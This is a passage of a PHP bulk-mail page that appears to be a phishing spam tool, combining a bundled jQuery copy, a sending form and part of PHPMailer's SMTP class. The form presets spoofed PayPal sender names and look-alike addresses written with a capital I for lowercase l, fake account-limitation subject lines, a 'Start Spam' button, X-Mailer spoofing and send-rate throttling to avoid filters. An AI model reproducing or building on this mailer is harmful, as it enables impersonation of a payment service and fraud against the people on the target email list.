                }).complete(callback && function(jqXHR, status) {
                    self.each(callback, response || [jqXHR.responseText, status, jqXHR])
                })
            }
            return this
        };
        jQuery.each(["ajaxStart", "ajaxStop", "ajaxComplete", "ajaxError", "ajaxSuccess", "ajaxSend"], function(i, type) {
            jQuery.fn[type] = function(fn) {
                return this.on(type, fn)
            }
        });
        jQuery.expr.filters.animated = function(elem) {
            return jQuery.grep(jQuery.timers, function(fn) {
                return elem === fn.elem
            }).length
        };
        var docElem = window.document.documentElement;

        function getWindow(elem) {
            return jQuery.isWindow(elem) ? elem : elem.nodeType === 9 ? elem.defaultView || elem.parentWindow : false
        }
        jQuery.offset = {
            setOffset: function(elem, options, i) {
                var curPosition, curLeft, curCSSTop, curTop, curOffset, curCSSLeft, calculatePosition, position = jQuery.css(elem, "position"),
                    curElem = jQuery(elem),
                    props = {};
                if (position === "static") {
                    elem.style.position = "relative"
                }
                curOffset = curElem.offset();
                curCSSTop = jQuery.css(elem, "top");
                curCSSLeft = jQuery.css(elem, "left");
                calculatePosition = (position === "absolute" || position === "fixed") && jQuery.inArray("auto", [curCSSTop, curCSSLeft]) > -1;
                if (calculatePosition) {
                    curPosition = curElem.position();
                    curTop = curPosition.top;
                    curLeft = curPosition.left
                } else {
                    curTop = parseFloat(curCSSTop) || 0;
                    curLeft = parseFloat(curCSSLeft) || 0
                }
                if (jQuery.isFunction(options)) {
                    options = options.call(elem, i, curOffset)
                }
                if (options.top != null) {
                    props.top = (options.top - curOffset.top) + curTop
                }
                if (options.left != null) {
                    props.left = (options.left - curOffset.left) + curLeft
                }
                if ("using" in options) {
                    options.using.call(elem, props)
                } else {
                    curElem.css(props)
                }
            }
        };
        jQuery.fn.extend({
            offset: function(options) {
                if (arguments.length) {
                    return options === undefined ? this : this.each(function(i) {
                        jQuery.offset.setOffset(this, options, i)
                    })
                }
                var docElem, win, box = {
                        top: 0,
                        left: 0
                    },
                    elem = this[0],
                    doc = elem && elem.ownerDocument;
                if (!doc) {
                    return
                }
                docElem = doc.documentElement;
                if (!jQuery.contains(docElem, elem)) {
                    return box
                }
                if (typeof elem.getBoundingClientRect !== strundefined) {
                    box = elem.getBoundingClientRect()
                }
                win = getWindow(doc);
                return {
                    top: box.top + (win.pageYOffset || docElem.scrollTop) - (docElem.clientTop || 0),
                    left: box.left + (win.pageXOffset || docElem.scrollLeft) - (docElem.clientLeft || 0)
                }
            },
            position: function() {
                if (!this[0]) {
                    return
                }
                var offsetParent, offset, parentOffset = {
                        top: 0,
                        left: 0
                    },
                    elem = this[0];
                if (jQuery.css(elem, "position") === "fixed") {
                    offset = elem.getBoundingClientRect()
                } else {
                    offsetParent = this.offsetParent();
                    offset = this.offset();
                    if (!jQuery.nodeName(offsetParent[0], "html")) {
                        parentOffset = offsetParent.offset()
                    }
                    parentOffset.top += jQuery.css(offsetParent[0], "borderTopWidth", true);
                    parentOffset.left += jQuery.css(offsetParent[0], "borderLeftWidth", true)
                }
                return {
                    top: offset.top - parentOffset.top - jQuery.css(elem, "marginTop", true),
                    left: offset.left - parentOffset.left - jQuery.css(elem, "marginLeft", true)
                }
            },
            offsetParent: function() {
                return this.map(function() {
                    var offsetParent = this.offsetParent || docElem;
                    while (offsetParent && (!jQuery.nodeName(offsetParent, "html") && jQuery.css(offsetParent, "position") === "static")) {
                        offsetParent = offsetParent.offsetParent
                    }
                    return offsetParent || docElem
                })
            }
        });
        jQuery.each({
            scrollLeft: "pageXOffset",
            scrollTop: "pageYOffset"
        }, function(method, prop) {
            var top = /Y/.test(prop);
            jQuery.fn[method] = function(val) {
                return access(this, function(elem, method, val) {
                    var win = getWindow(elem);
                    if (val === undefined) {
                        return win ? (prop in win) ? win[prop] : win.document.documentElement[method] : elem[method]
                    }
                    if (win) {
                        win.scrollTo(!top ? val : jQuery(win).scrollLeft(), top ? val : jQuery(win).scrollTop())
                    } else {
                        elem[method] = val
                    }
                }, method, val, arguments.length, null)
            }
        });
        jQuery.each(["top", "left"], function(i, prop) {
            jQuery.cssHooks[prop] = addGetHookIf(support.pixelPosition, function(elem, computed) {
                if (computed) {
                    computed = curCSS(elem, prop);
                    return rnumnonpx.test(computed) ? jQuery(elem).position()[prop] + "px" : computed
                }
            })
        });
        jQuery.each({
            Height: "height",
            Width: "width"
        }, function(name, type) {
            jQuery.each({
                padding: "inner" + name,
                content: type,
                "": "outer" + name
            }, function(defaultExtra, funcName) {
                jQuery.fn[funcName] = function(margin, value) {
                    var chainable = arguments.length && (defaultExtra || typeof margin !== "boolean"),
                        extra = defaultExtra || (margin === true || value === true ? "margin" : "border");
                    return access(this, function(elem, type, value) {
                        var doc;
                        if (jQuery.isWindow(elem)) {
                            return elem.document.documentElement["client" + name]
                        }
                        if (elem.nodeType === 9) {
                            doc = elem.documentElement;
                            return Math.max(elem.body["scroll" + name], doc["scroll" + name], elem.body["offset" + name], doc["offset" + name], doc["client" + name])
                        }
                        return value === undefined ? jQuery.css(elem, type, extra) : jQuery.style(elem, type, value, extra)
                    }, type, chainable ? margin : undefined, chainable, null)
                }
            })
        });
        jQuery.fn.size = function() {
            return this.length
        };
        jQuery.fn.andSelf = jQuery.fn.addBack;
        if (typeof define === "function" && define.amd) {
            define("jquery", [], function() {
                return jQuery
            })
        }
        var _jQuery = window.jQuery,
            _$ = window.$;
        jQuery.noConflict = function(deep) {
            if (window.$ === jQuery) {
                window.$ = _$
            }
            if (deep && window.jQuery === jQuery) {
                window.jQuery = _jQuery
            }
            return jQuery
        };
        if (typeof noGlobal === strundefined) {
            window.jQuery = window.$ = jQuery
        }
        return jQuery
        }));
    </script>
    </div>
            <div class="col-sm-4" style="padding-left: 7.5px !important;">
              <div style="margin-bottom: 10px" class="input-group">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-envelope"></i><b> Content Type</b></span>
                    <select class="form-control" name="type">
                      <option value="html" <?php if ($type=='html'){echo 'selected';}?> >text/html</option>
                      <option value="plain" <?php if ($type=='plain'){echo 'selected';}?> >text/plain</option>
                    </select>
                  </div>
              <div style="margin-bottom: 10px" class="input-group">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-envelope"></i></span>
                    <select class="form-control" onChange="Pilih4(this);">
                      <option value="">No X-Mailer</option>
                      <option value="Gleez CMS 0.10.5">Gleez CMS 0.10.5</option>
                      <option value="Gleez CMS 1.1.6">Gleez CMS 1.1.6</option>
                      <option value="EDMAIL R6.00.02">EDMAIL R6.00.02</option>
                      <option value="PHP/<?php echo(phpversion());?>">PHP/<?php echo(phpversion());?></option>
                    </select>
                    <input id="xmailer" type="text" class="form-control" name="xmailer" value="<?php echo $xmailer;?>" placeholder="X-Mailer">
                  </div>
            </div>
            </div>

            <div class="col-sm-8" style="padding-right: 7.5px !important;">

              <div style="margin-bottom: 10px" class="input-group">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-user"></i></span>
                    <select class="form-control" onChange="Pilih1(this);">
                      <option value="">Select Sender Name</option>
                      <option value="PayPaI">PayPaI</option>
                      <option value="PaypaI Service">PaypaI Service</option>
                      <option value="PaypaI Support">PaypaI Support</option>
                      <option value="Account Service">Account Service</option>
                      <option value="Account Support">Account Support</option>
                      <option value="Service">Service</option>
                    </select>
                    <input id="sender-name" type="text" class="form-control" name="nama" value="<?php echo $nama;?>" placeholder="Sender Name">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-envelope"></i></span>
                    <select class="form-control kanan" onChange="Pilih2(this);">
                      <option value="">Select Sender Email</option>
                      <option value="service@intI.paypaI.com">service@intI.paypaI.com</option>
                      <option value="service@paypaI.co.uk">service@paypaI.co.uk</option>
                      <option value="paypaI@e.paypaI.co.uk">paypaI@e.paypaI.co.uk</option>
                      <option value="no-reply">no-reply</option>
                      <option value="admin">admin</option>
                      <option value="service">service</option>
                      <option value="same as target">same as target</option>

                    </select>
                    <input id="sender-email" type="text" class="form-control kanan-l" name="mail" value="<?php echo $email;?>" placeholder="Sender Email">
                  </div>

              <div style="margin-bottom: 10px" class="input-group">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-comment"></i></span>
                    <select class="form-control kanan" onChange="Pilih3(this);">ge
                      <option value="">Select Email Subject</option>
                      <option value="Your account has been Iimited untiI we hear from you">Your account has been Iimited untiI we hear from you</option>
                      <option value="We're investigating a paypaI payment reversaI (Case ID #PP-003-498-237-832)">We're investigating a paypaI payment reversaI (Case ID #PP-003-498-237-832)</option>
                      <option value="We've Iimited access to your PayPaI account">We've Iimited access to your PayPaI account</option>
                      <option value="Account Notification">Account Notification</option>
                      <option value="Attention: Your account status change">Attention: Your account status change</option>

                    </select>
                    <input id="subject" type="text" class="form-control kanan-l" name="subject" value="<?php echo $subject;?>" placeholder="Subject">
                  </div>

              <div style="margin-bottom: 5px" class="input-group">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-paperclip"></i><b> Attach</b></span>
                    <input id="attachment" class="form-control" style="padding: 0 !important" type="file" name="file">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-pencil"></i><b> Encode</b></span>
                    <select class="form-control" name="encode">
                      <option value="" <?php if ($encoding==''){echo 'selected';}?> >Select Encoding</option>
                      <option value="base64" <?php if ($encoding=='base64'){echo 'selected';}?> >base64</option>
                      <option value="7bit" <?php if ($encoding=='7bit'){echo 'selected';}?> >7bit</option>
                      <option value="8bit" <?php if ($encoding=='8bit'){echo 'selected';}?> >8bit</option>
                      <option value="binary" <?php if ($encoding=='binary'){echo 'selected';}?> >binary</option>
                      <option value="quoted-printable" <?php if ($encoding=='quoted-printable'){echo 'selected';}?> >quoted-printable</option>
                    </select>
                  </div>
              <div style="margin-bottom: 10px" class="input-group">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-align-justify"></i></span>
                    <textarea class="form-control" rows="10" name="pesan" placeholder="Message"><?php echo $pesan;?></textarea>
                  </div>
              <div style="margin-bottom: 10px" class="input-group">
                    <input type="submit" class="btn btn-success" name="action" value="Start Spam">
                    <font color="white">Next send after </font>
                    <input type="text" name="wait" value="<?php echo $wait;?>" style="width: 50px;border-radius: 4px;padding: 3px 6px;">
                    <font color="white">(second) | Reconnect After
                    <input type="text" name="reconnect" value="<?php echo $reconnect;?>" style="width: 50px;border-radius: 4px;padding: 3px 6px;">
                    <font color="white">(emails)</font>
                  </div>

            </div>
            <div class="col-sm-4" style="padding-left: 7.5px !important;">

              <div style="margin-bottom: 10px" class="input-group">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-lock"></i><b> Encode Headers</b></span>
                    <select class="form-control" name="encoding">
                      <option value="yes" <?php if ($_POST['encoding']=='yes'){echo 'selected';}?> >yes</option>
                      <option value="no" <?php if ($_POST['encoding']=='no'){echo 'selected';}?> >no</option>
                    </select>
                  </div>
              <div style="margin-bottom: 10px" class="input-group">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-list"></i></span>
                    <textarea class="form-control" rows="18" name="list" placeholder="Email List"><?php echo $emaillist;?></textarea>
                  </div>

            </div>
                <div class="form-group">
                </div>

            </form>

            </div>
      </div>
<?php

if ($action){

    if (!$from && !$subject && !$message && !$emaillist) {
        print "<script>alert('Please complete all fields before sending your message.'); </script>";
        die();
    }

  if ($_POST['encoding']=='yes') {
    $subject = preg_replace('/([^a-z ])/ie', 'sprintf("=%02x",ord(StripSlashes("\\1")))', $subject);
        $subject = str_replace(' ', '=20', $subject);
        $subject = "=?utf-8?Q?$subject?=";
        $nama    = preg_replace('/([^a-z ])/ie', 'sprintf("=%02x",ord(StripSlashes("\\1")))', $nama);
        $nama    = str_replace(' ', '=20', $nama);
        $nama    = "=?utf-8?Q?$nama?=";
  }

  $allemails = split("\n", $emaillist);
  $numemails = count($allemails);


  function xflush()
  {
    static $output_handler = null;
    if ($output_handler === null) {
      $output_handler = @ini_get('output_handler');
    }
    if ($output_handler == 'ob_gzhandler') {
      return;
    }
    flush();
    if (function_exists('ob_flush') AND function_exists('ob_get_length') AND ob_get_length() !== false) {
      @ob_flush();
    } else if (function_exists('ob_end_flush') AND function_exists('ob_start') AND function_exists('ob_get_length') AND ob_get_length() !== FALSE) {
      @ob_end_flush();
      @ob_start();
    }
  }
?>
<?php
/**
 * PHPMailer RFC821 SMTP email transport class.
 * PHP Version 5
 * @package PHPMailer
 * @link https://github.com/PHPMailer/PHPMailer/ The PHPMailer GitHub project
 * @author Marcus Bointon (Synchro/coolbru) <phpmailer@synchromedia.co.uk>
 * @author Jim Jagielski (jimjag) <>
 * @author Andy Prevost (codeworxtech) <codeworxtech@users.sourceforge.net>
 * @author Brent R. Matzelle (original founder)
 * @copyright 2014 Marcus Bointon
 * @copyright 2010 - 2012 Jim Jagielski
 * @copyright 2004 - 2009 Andy Prevost
 * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
 * @note This program is distributed in the hope that it will be useful - WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE.
 */

/**
 * PHPMailer RFC821 SMTP email transport class.
 * Implements RFC 821 SMTP commands and provides some utility methods for sending mail to an SMTP server.
 * @package PHPMailer
 * @author Chris Ryan
 * @author Marcus Bointon <phpmailer@synchromedia.co.uk>
 */
class SMTP
{
    /**
     * The PHPMailer SMTP version number.
     * @type string
     */
    const VERSION = '5.2.9';

    /**
     * SMTP line break constant.
     * @type string
     */
    const CRLF = "\r\n";

    /**
     * The SMTP port to use if one is not specified.
     * @type integer
     */
    const DEFAULT_SMTP_PORT = 25;

    /**
     * The maximum line length allowed by RFC 2822 section 2.1.1
     * @type integer
     */
    const MAX_LINE_LENGTH = 998;

    /**
     * Debug level for no output
     */
    const DEBUG_OFF = 0;

    /**
     * Debug level to show client -> server messages
     */
    const DEBUG_CLIENT = 1;

    /**
     * Debug level to show client -> server and server -> client messages
     */
    const DEBUG_SERVER = 2;

    /**
     * Debug level to show connection status, client -> server and server -> client messages
     */
    const DEBUG_CONNECTION = 3;

    /**
     * Debug level to show all messages
     */
    const DEBUG_LOWLEVEL = 4;

    /**
     * The PHPMailer SMTP Version number.
     * @type string
     * @deprecated Use the `VERSION` constant instead
     * @see SMTP::VERSION
     */
    public $Version = '5.2.9';

    /**
     * SMTP server port number.
     * @type integer
     * @deprecated This is only ever used as a default value, so use the `DEFAULT_SMTP_PORT` constant instead
     * @see SMTP::DEFAULT_SMTP_PORT
     */
    public $SMTP_PORT = 25;

    /**
     * SMTP reply line ending.
     * @type string
     * @deprecated Use the `CRLF` constant instead
     * @see SMTP::CRLF
     */
    public $CRLF = "\r\n";

    /**
     * Debug output level.
     * Options:
     * * self::DEBUG_OFF (`0`) No debug output, default
     * * self::DEBUG_CLIENT (`1`) Client commands
     * * self::DEBUG_SERVER (`2`) Client commands and server responses
     * * self::DEBUG_CONNECTION (`3`) As DEBUG_SERVER plus connection status
     * * self::DEBUG_LOWLEVEL (`4`) Low-level data output, all messages
     * @type integer
     */
    public $do_debug = self::DEBUG_OFF;

    /**
     * How to handle debug output.
     * Options:
     * * `echo` Output plain-text as-is, appropriate for CLI
     * * `html` Output escaped, line breaks converted to `<br>`, appropriate for browser output
     * * `error_log` Output to error log as configured in php.ini
     *
     * Alternatively, you can provide a callable expecting two params: a message string and the debug level:
     * <code>
     * $smtp->Debugoutput = function($str, $level) {echo "debug level $level; message: $str";};
     * </code>
     * @type string|callable
     */
    public $Debugoutput = 'echo';

    /**
     * Whether to use VERP.
     * @link http://en.wikipedia.org/wiki/Variable_envelope_return_path
     * @link http://www.postfix.org/VERP_README.html Info on VERP
     * @type boolean
     */
    public $do_verp = false;

    /**
     * The timeout value for connection, in seconds.
     * Default of 5 minutes (300sec) is from RFC2821 section 4.5.3.2
     * This needs to be quite high to function correctly with hosts using greetdelay as an anti-spam measure.
     * @link http://tools.ietf.org/html/rfc2821#section-4.5.3.2
     * @type integer
     */
    public $Timeout = 300;

    /**
     * How long to wait for commands to complete, in seconds.
     * Default of 5 minutes (300sec) is from RFC2821 section 4.5.3.2
     * @type integer
     */
    public $Timelimit = 300;

    /**
     * The socket for the server connection.
     * @type resource
     */
    protected $smtp_conn;

    /**
     * Error message, if any, for the last call.
     * @type array
     */
    protected $error = array();

    /**
     * The reply the server sent to us for HELO.
     * If null, no HELO string has yet been received.
     * @type string|null
     */
    protected $helo_rply = null;

    /**
     * The set of SMTP extensions sent in reply to EHLO command.
     * Indexes of the array are extension names.
     * Value at index 'HELO' or 'EHLO' (according to command that was sent)
     * represents the server name. In case of HELO it is the only element of the array.
     * Other values can be boolean TRUE or an array containing extension options.
     * If null, no HELO/EHLO string has yet been received.
     * @type array|null
     */
    protected $server_caps = null;

    /**
     * The most recent reply received from the server.
     * @type string
     */
    protected $last_reply = '';

    /**
     * Output debugging info via a user-selected method.
     * @see SMTP::$Debugoutput
     * @see SMTP::$do_debug
     * @param string $str Debug string to output
     * @param integer $level The debug level of this message; see DEBUG_* constants
     * @return void
     */
    protected function edebug($str, $level = 0)
    {
        if ($level > $this->do_debug) {
            return;
        }
        //Avoid clash with built-in function names
        if (!in_array($this->Debugoutput, array('error_log', 'html', 'echo')) and is_callable($this->Debugoutput)) {
            call_user_func($this->Debugoutput, $str, $this->do_debug);
            return;
        }
        switch ($this->Debugoutput) {
            case 'error_log':
                //Don't output, just log
                error_log($str);
                break;
            case 'html':
                //Cleans up output a bit for a better looking, HTML-safe output
                echo htmlentities(
                    preg_replace('/[\r\n]+/', '', $str),
                    ENT_QUOTES,
                    'UTF-8'
                )
                . "<br>\n";
                break;
            case 'echo':
            default:
                //Normalize line breaks
                $str = preg_replace('/(\r\n|\r|\n)/ms', "\n", $str);
                echo gmdate('Y-m-d H:i:s') . "\t" . str_replace(
                    "\n",
                    "\n                   \t                  ",
                    trim($str)
                )."\n";
        }
    }

    /**
     * Connect to an SMTP server.
     * @param string $host SMTP server IP or host name
     * @param integer $port The port number to connect to
     * @param integer $timeout How long to wait for the connection to open
     * @param array $options An array of options for stream_context_create()
     * @access public
     * @return boolean
     */
    public function connect($host, $port = null, $timeout = 30, $options = array())
    {
        static $streamok;
        //This is enabled by default since 5.0.0 but some providers disable it
        //Check this once and cache the result
        if (is_null($streamok)) {
            $streamok = function_exists('stream_socket_client');
        }
        // Clear errors to avoid confusion
        $this->error = array();
        // Make sure we are __not__ connected
        if ($this->connected()) {
            // Already connected, generate error
            $this->error = array('error' => 'Already connected to a server');
            return false;
        }
        if (empty($port)) {
            $port = self::DEFAULT_SMTP_PORT;
        }
        // Connect to the SMTP server
        $this->edebug(
            "Connection: opening to $host:$port, t=$timeout, opt=".var_export($options, true),
            self::DEBUG_CONNECTION
        );
        $errno = 0;
        $errstr = '';
        if ($streamok) {
            $socket_context = stream_context_create($options);
            //Suppress errors; connection failures are handled at a higher level
            $this->smtp_conn = @stream_socket_client(
                $host . ":" . $port,
                $errno,
                $errstr,
                $timeout,
                STREAM_CLIENT_CONNECT,
                $socket_context
            );
        } else {
            //Fall back to fsockopen which should work in more places, but is missing some features
            $this->edebug(
                "Connection: stream_socket_client not available, falling back to fsockopen",
                self::DEBUG_CONNECTION
            );
            $this->smtp_conn = fsockopen(
                $host,
                $port,
                $errno,
                $errstr,
                $timeout
            );
        }
        // Verify we connected properly
        if (!is_resource($this->smtp_conn)) {
            $this->error = array(
                'error' => 'Failed to connect to server',
                'errno' => $errno,
                'errstr' => $errstr
            );
            $this->edebug(
                'SMTP ERROR: ' . $this->error['error']
                . ": $errstr ($errno)",
                self::DEBUG_CLIENT
            );
            return false;
        }
        $this->edebug('Connection: opened', self::DEBUG_CONNECTION);
        // SMTP server can take longer to respond, give longer timeout for first read
        // Windows does not have support for this timeout function
        if (substr(PHP_OS, 0, 3) != 'WIN') {
            $max = ini_get('max_execution_time');
            if ($max != 0 && $timeout > $max) { // Don't bother if unlimited
                @set_time_limit($timeout);
            }
            stream_set_timeout($this->smtp_conn, $timeout, 0);
        }
        // Get any announcement
        $announce = $this->get_lines();
        $this->edebug('SERVER -> CLIENT: ' . $announce, self::DEBUG_SERVER);
        return true;
    }

    /**
     * Initiate a TLS (encrypted) session.
     * @access public
     * @return boolean
     */
    public function startTLS()
    {
        if (!$this->sendCommand('STARTTLS', 'STARTTLS', 220)) {
            return false;
        }
        // Begin encrypted connection
        if (!stream_socket_enable_crypto(
            $this->smtp_conn,
            true,
            STREAM_CRYPTO_METHOD_TLS_CLIENT
        )) {
            return false;
        }
        return true;
    }

    /**
     * Perform SMTP authentication.
     * Must be run after hello().
     * @see hello()
     * @param string $username    The user name
     * @param string $password    The password
     * @param string $authtype    The auth type (PLAIN, LOGIN, NTLM, CRAM-MD5)
     * @param string $realm       The auth realm for NTLM
     * @param string $workstation The auth workstation for NTLM
     * @access public
     * @return boolean True if successfully authenticated.
     */
    public function authenticate(
        $username,
        $password,
        $authtype = null,
        $realm = '',
        $workstation = ''
    ) {
        if (!$this->server_caps) {
            $this->error = array('error' => 'Authentication is not allowed before HELO/EHLO');
            return false;
        }

        if (array_key_exists('EHLO', $this->server_caps)) {
        // SMTP extensions are available. Let's try to find a proper authentication method

            if (!array_key_exists('AUTH', $this->server_caps)) {
                $this->error = array( 'error' => 'Authentication is not allowed at this stage' );
                // 'at this stage' means that auth may be allowed after the stage changes
                // e.g. after STARTTLS
                return false;
            }

            self::edebug('Auth method requested: ' . ($authtype ? $authtype : 'UNKNOWN'), self::DEBUG_LOWLEVEL);
            self::edebug(
                'Auth methods available on the server: ' . implode(',', $this->server_caps['AUTH']),
                self::DEBUG_LOWLEVEL
            );

            if (empty($authtype)) {
                foreach (array('LOGIN', 'CRAM-MD5', 'NTLM', 'PLAIN') as $method) {
                    if (in_array($method, $this->server_caps['AUTH'])) {
                        $authtype = $method;
                        break;
                    }
                }
                if (empty($authtype)) {
                    $this->error = array( 'error' => 'No supported authentication methods found' );
                    return false;
                }
                self::edebug('Auth method selected: '.$authtype, self::DEBUG_LOWLEVEL);
            }

            if (!in_array($authtype, $this->server_caps['AUTH'])) {
                $this->error = array( 'error' => 'The requested authentication method "'
                    . $authtype . '" is not supported by the server' );
                return false;
            }
        } elseif (empty($authtype)) {
            $authtype = 'LOGIN';
        }
        switch ($authtype) {
            case 'PLAIN':
                // Start authentication
                if (!$this->sendCommand('AUTH', 'AUTH PLAIN', 334)) {
                    return false;
                }
                // Send encoded username and password
                if (!$this->sendCommand(
                    'User & Password',
                    base64_encode("\0" . $username . "\0" . $password),
                    235
                )
                ) {
                    return false;
                }
                break;
            case 'LOGIN':
                // Start authentication
                if (!$this->sendCommand('AUTH', 'AUTH LOGIN', 334)) {
                    return false;
                }
                if (!$this->sendCommand("Username", base64_encode($username), 334)) {
                    return false;
                }
                if (!$this->sendCommand("Password", base64_encode($password), 235)) {
                    return false;
                }
                break;
            case 'NTLM':
                /*
                 * ntlm_sasl_client.php
                 * Bundled with Permission
                 *
                 * How to telnet in windows:
                 * http://technet.microsoft.com/en-us/library/aa995718%28EXCHG.65%29.aspx
                 * PROTOCOL Docs http://curl.haxx.se/rfc/ntlm.html#ntlmSmtpAuthentication
                 */
                require_once 'extras/ntlm_sasl_client.php';
                $temp = new stdClass();
                $ntlm_client = new ntlm_sasl_client_class;
                //Check that functions are available
                if (!$ntlm_client->Initialize($temp)) {
                    $this->error = array('error' => $temp->error);
                    $this->edebug(
                        'You need to enable some modules in your php.ini file: '
                        . $this->error['error'],
                        self::DEBUG_CLIENT
                    );
                    return false;
                }
                //msg1
                $msg1 = $ntlm_client->TypeMsg1($realm, $workstation); //msg1

                if (!$this->sendCommand(
                    'AUTH NTLM',
                    'AUTH NTLM ' . base64_encode($msg1),
                    334
                )
                ) {
                    return false;
                }
                //Though 0 based, there is a white space after the 3 digit number
                //msg2
                $challenge = substr($this->last_reply, 3);
                $challenge = base64_decode($challenge);
                $ntlm_res = $ntlm_client->NTLMResponse(
                    substr($challenge, 24, 8),
                    $password
                );
                //msg3
                $msg3 = $ntlm_client->TypeMsg3(
                    $ntlm_res,
                    $username,
                    $realm,
                    $workstation
                );
                // send encoded username
                return $this->sendCommand('Username', base64_encode($msg3), 235);
            case 'CRAM-MD5':
                // Start authentication
                if (!$this->sendCommand('AUTH CRAM-MD5', 'AUTH CRAM-MD5', 334)) {
                    return false;
                }
                // Get the challenge
                $challenge = base64_decode(substr($this->last_reply, 4));

                // Build the response
                $response = $username . ' ' . $this->hmac($challenge, $password);

                // send encoded credentials
                return $this->sendCommand('Username', base64_encode($response), 235);
            default:
                $this->error = array( 'error' => 'Authentication method "' . $authtype . '" is not supported' );
                return false;
        }
        return true;
    }

    /**
     * Calculate an MD5 HMAC hash.
     * Works like hash_hmac('md5', $data, $key)
     * in case that function is not available
     * @param string $data The data to hash
     * @param string $key  The key to hash with
     * @access protected
     * @return string
     */
    protected function hmac($data, $key)
    {
        if (function_exists('hash_hmac')) {
            return hash_hmac('md5', $data, $key);
        }

        // The following borrowed from
        // http://php.net/manual/en/function.mhash.php#27225

        // RFC 2104 HMAC implementation for php.
        // Creates an md5 HMAC.
        // Eliminates the need to install mhash to compute a HMAC
        // by Lance Rushing

        $bytelen = 64; // byte length for md5
        if (strlen($key) > $bytelen) {
            $key = pack('H*', md5($key));
        }
        $key = str_pad($key, $bytelen, chr(0x00));
        $ipad = str_pad('', $bytelen, chr(0x36));
        $opad = str_pad('', $bytelen, chr(0x5c));
        $k_ipad = $key ^ $ipad;
        $k_opad = $key ^ $opad;

        return md5($k_opad . pack('H*', md5($k_ipad . $data)));
    }

    /**
     * Check connection state.
     * @access public
     * @return boolean True if connected.
     */
    public function connected()
    {
        if (is_resource($this->smtp_conn)) {
            $sock_status = stream_get_meta_data($this->smtp_conn);
            if ($sock_status['eof']) {
                // The socket is valid but we are not connected
                $this->edebug(
                    'SMTP NOTICE: EOF caught while checking if connected',
                    self::DEBUG_CLIENT
                );
                $this->close();
                return false;
            }
            return true; // everything looks good
        }
        return false;
    }

    /**
     * Close the socket and clean up the state of the class.
     * Don't use this function without first trying to use QUIT.
     * @see quit()
     * @access public
     * @return void
     */
    public function close()
    {
        $this->error = array();
        $this->server_caps = null;
        $this->helo_rply = null;
        if (is_resource($this->smtp_conn)) {
            // close the connection and cleanup
            fclose($this->smtp_conn);
            $this->smtp_conn = null; //Makes for cleaner serialization
            $this->edebug('Connection: closed', self::DEBUG_CONNECTION);
        }
    }

    /**
     * Send an SMTP DATA command.
     * Issues a data command and sends the msg_data to the server,
     * finializing the mail transaction. $msg_data is the message
     * that is to be send with the headers. Each header needs to be
     * on a single line followed by a <CRLF> with the message headers
     * and the message body being separated by and additional <CRLF>.
     * Implements rfc 821: DATA <CRLF>
     * @param string $msg_data Message data to send
     * @access public
     * @return boolean
     */
    public function data($msg_data)
    {
        //This will use the standard timelimit
        if (!$this->sendCommand('DATA', 'DATA', 354)) {
            return false;
        }

        /* The server is ready to accept data!
         * According to rfc821 we should not send more than 1000 characters on a single line (including the CRLF)
         * so we will break the data up into lines by \r and/or \n then if needed we will break each of those into
         * smaller lines to fit within the limit.
         * We will also look for lines that start with a '.' and prepend an additional '.'.
         * NOTE: this does not count towards line-length limit.
         */

        // Normalize line breaks before exploding
        $lines = explode("\n", str_replace(array("\r\n", "\r"), "\n", $msg_data));

        /* To distinguish between a complete RFC822 message and a plain message body, we check if the first field
         * of the first line (':' separated) does not contain a space then it _should_ be a header and we will
         * process all lines before a blank line as headers.
         */

        $field = substr($lines[0], 0, strpos($lines[0], ':'));
        $in_headers = false;
        if (!empty($field) && strpos($field, ' ') === false) {
            $in_headers = true;
        }

        foreach ($lines as $line) {
            $lines_out = array();
            if ($in_headers and $line == '') {
                $in_headers = false;
            }
            //We need to break this line up into several smaller lines
            //This is a small micro-optimisation: isset($str[$len]) is equivalent to (strlen($str) > $len)
            while (isset($line[self::MAX_LINE_LENGTH])) {
                //Working backwards, try to find a space within the last MAX_LINE_LENGTH chars of the line to break on
                //so as to avoid breaking in the middle of a word
                $pos = strrpos(substr($line, 0, self::MAX_LINE_LENGTH), ' ');
                if (!$pos) { //Deliberately matches both false and 0
                    //No nice break found, add a hard break
                    $pos = self::MAX_LINE_LENGTH - 1;
                    $lines_out[] = substr($line, 0, $pos);
                    $line = substr($line, $pos);
                } else {
                    //Break at the found point
                    $lines_out[] = substr($line, 0, $pos);
                    //Move along by the amount we dealt with
                    $line = substr($line, $pos + 1);
                }
                //If processing headers add a LWSP-char to the front of new line RFC822 section 3.1.1
                if ($in_headers) {
                    $line = "\t" . $line;
                }
            }
            $lines_out[] = $line;

            //Send the lines to the server
            foreach ($lines_out as $line_out) {
                //RFC2821 section 4.5.2
                if (!empty($line_out) and $line_out[0] == '.') {
                    $line_out = '.' . $line_out;
                }
                $this->client_send($line_out . self::CRLF);
            }
        }

        //Message data has been sent, complete the command
        //Increase timelimit for end of DATA command
        $savetimelimit = $this->Timelimit;
        $this->Timelimit = $this->Timelimit * 2;
        $result = $this->sendCommand('DATA END', '.', 250);
        //Restore timelimit
        $this->Timelimit = $savetimelimit;
        return $result;
    }

    /**
     * Send an SMTP HELO or EHLO command.
     * Used to identify the sending server to the receiving server.
     * This makes sure that client and server are in a known state.
     * Implements RFC 821: HELO <SP> <domain> <CRLF>
     * and RFC 2821 EHLO.
     * @param string $host The host name or IP to connect to
     * @access public
     * @return boolean
     */
    public function hello($host = '')
    {
        //Try extended hello first (RFC 2821)
        return (boolean)($this->sendHello('EHLO', $host) or $this->sendHello('HELO', $host));
    }

    /**
     * Send an SMTP HELO or EHLO command.
     * Low-level implementation used by hello()
     * @see hello()
     * @param string $hello The HELO string
     * @param string $host The hostname to say we are
     * @access protected
     * @return boolean
     */
    protected function sendHello($hello, $host)
    {
        $noerror = $this->sendCommand($hello, $hello . ' ' . $host, 250);
        $this->helo_rply = $this->last_reply;
        if ($noerror) {
            $this->parseHelloFields($hello);
        } else {
            $this->server_caps = null;
